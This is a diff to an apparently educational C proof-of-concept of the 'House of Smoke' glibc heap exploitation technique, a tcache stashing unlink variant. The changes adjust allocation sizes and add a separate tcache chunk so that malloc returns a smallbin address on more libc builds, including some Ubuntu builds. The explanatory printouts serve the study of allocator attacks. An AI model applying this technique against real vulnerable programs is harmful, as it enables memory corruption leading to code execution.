@@ -4,7 +4,7 @@
  * PoC and technique by Imrane Haddaji (@tabacc0)
  *
  * Works on common builds of libc versions 2.26 to 2.41
- * note : does not work on ubuntu builds for versions 2.31 to 2.34
+ * 
  *
  * detailed explanation of the stashing unlink attack 
  * the core mechanism behind this , along with how this
@@ -32,7 +32,7 @@
 #include <stdio.h>
 #include <unistd.h>
 
-#define ALLOC_SIZE 0x140
+#define ALLOC_SIZE 0x220
 
 int main(){
 	//initialize tcache and calculate where it is, we do it now for the 
@@ -43,8 +43,10 @@ int main(){
 	//ASSUMING HEAP LEAK TO CALCULATE WHERE TCACHE IS
 	char *tcache = init - 0x10 - 0x240;
 	//making it point to tcache entry of the size we are 
-	//going to work with
-	tcache += 0x40 + (int)(ALLOC_SIZE/0x10 - 1)*8 ;
+	//going to work with + 0x10 , this is so that we allocate
+	//from a different tcache that the one holding victim 
+	//as the one holding victim has issues in some ubuntu builds
+	tcache += 0x40 + (int)((ALLOC_SIZE+0x10)/0x10 - 1)*8 ;
 
 	printf("This PoC demonstrates the House of Smoke .\n\n");
 	printf("This attack allows an attacker to return a chunk within\n");
@@ -77,9 +79,16 @@ int main(){
 	printf("bin and then allocate a chunk (size 0x400) that will be cut from it\n");
 	printf("leaving us with a chunk of our desired size in the unsorted bin\n");
 	char *victim = malloc(0x410 + ALLOC_SIZE);
+
+	//this is a chunk we put in tcache then  we overwrite it with bin address
+	printf("\n\nAllocating a chunk of victim size + 0x10\n");
+	printf("\n\nwe will overwrite this chunk with bin address\n");
+	char *tcache_chunk = malloc(ALLOC_SIZE+0x10);
 	//to avoid consolidation with top
 	printf("\n\nAllocating a guard chunk to avoid consolidatin with the top chunk\n");
 	char *guard = malloc(0x1000);
+	//put in tcache 
+	free(tcache_chunk);
 	//put victim in unsorted bin
 	printf("\n\nFreeing victim\n");
 	free(victim);
@@ -141,18 +150,17 @@ int main(){
 	printf("\n\nAllocating a chunk of victim size , this will trigger a tcach stashing\n");
 	printf("from the smallbin holding victim , in the process of putting the last chunk\n");
 	printf("of the fake list the address of the smallbin just before the one containing\n");
-	printf("victim will be written to the tcache head, and after it the last fake \n");
-	printf("chunk will inserted , for clarity here is the code that does this : \n");
+	printf("victim will be written to the tcache head of the tcache entry of tcache_chunk");
+	printf("and after it the last fake chunk will inserted to tcache entry \n");
+	printf(" of victim , for clarity here is the code that does this : \n");
 	printf("\nbin->bk = bck;\nbck->fd = bin;\ntcache_put (tc_victim, tc_idx);\n\n");
 	char *trigger = malloc(ALLOC_SIZE);
-	printf("\n\nAllocating the last chunk of the fake list from the head of tcache\n");
-	printf("now the smallbin address is in the head of the tcache bin\n");
-	char *fake_head = malloc(ALLOC_SIZE);
 
-	printf("\n\nAllocating the bin address\n");
-	printf("char **allocated = malloc(ALLOC_SIZE);\n");
+	printf("\n\nAllocating the bin address from the tcache entry of tcache_chunk\n");
+	printf("after we overwrote it\n");
+	printf("char **allocated = malloc(ALLOC_SIZE+0x10);\n");
 	//ALLCATING BIN ADDRESS
-	char **allocated = malloc(ALLOC_SIZE);
+	char **allocated = malloc(ALLOC_SIZE+0x10);
 	printf("\n\nsanity check : \n");
 	printf("assert((long)allocated == (long)smallbin);\n");
 	assert((long)allocated == (long)smallbin);
